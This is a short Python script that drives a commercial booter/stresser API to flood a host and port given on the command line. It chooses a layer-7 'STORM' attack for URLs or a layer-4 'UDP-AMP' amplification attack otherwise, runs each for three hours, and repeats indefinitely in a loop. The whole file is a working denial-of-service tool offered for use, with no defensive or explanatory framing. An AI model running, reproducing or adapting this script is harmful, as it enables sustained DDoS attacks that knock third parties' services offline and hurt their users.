import time
import os
import requests
import sys
import json
import validators
from dotenv import load_dotenv

load_dotenv()

apiKey = os.getenv("API_KEY")
apiPath = "https://stresser.ai/api/api.php"
host = sys.argv[1]
port = sys.argv[2]
duration = 10800


def hitRequest():
    print(f"Start hit {host}:{port}")
    url = f"{apiPath}?key={apiKey}"
    if validators.url(host):
        url = f"{url}&action=layer7&host={host}&port={port}&time={duration}&method=STORM"
    else:
        locale = os.getenv("LOCALE") or ""
        url = f"{url}&action=layer4&host={host}&port={port}&time={duration}&method=UDP-AMP&locale={locale}"

    r = requests.get(url)
    print(r.text)

    text = json.loads(r.text)
    return text["status"] == True


while True:
    if hitRequest() is False:
        print("STOP")
        break
    time.sleep(duration + 5)
